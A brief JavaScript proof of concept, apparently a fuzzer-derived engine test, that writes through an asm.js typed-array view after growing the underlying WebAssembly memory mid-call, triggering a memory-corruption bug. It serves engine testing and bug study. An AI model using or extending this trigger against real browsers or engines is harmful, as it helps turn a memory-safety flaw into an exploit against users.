function module(a1, a2, a3) {
    'use asm';
    const t2 = a1.Uint32Array;
    const v5 = new t2(a3);
    var fl = v5;
    function f1(a8) {
        fl[0] = a8 = a8 | 0;
        fl[65536] = a8;
        fl[1048576] = a8;
    }
    return f1;
}
var global = { Uint32Array: Uint32Array };
var env = {};
const v17 = WebAssembly.Memory;
const v20 = new v17({ initial: 200 });
memory = v20;
var buffer = memory.buffer;
evil_f = module(global, env, buffer);
zz = {};
function f29() {
    const v30 = [];
    Array.prototype.slice.call(v30);
    return 4294967295;
}
zz.toString = f29;
evil_f(3);
memory.grow(1);
evil_f(zz);
